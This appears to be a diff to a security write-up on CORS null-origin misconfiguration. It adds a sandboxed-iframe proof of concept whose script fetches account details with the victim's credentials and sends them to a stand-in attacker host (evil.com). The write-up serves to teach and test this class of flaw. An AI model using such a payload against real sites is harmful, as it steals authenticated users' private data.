@@ -35,6 +35,19 @@ fetch('https://api.cors-null-vulnerable.com/sensitiveContent', {
 "></iframe> 
 ```
 
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://example.com/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://evil.com/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
+
 HTTP Request headers :
 
 ```
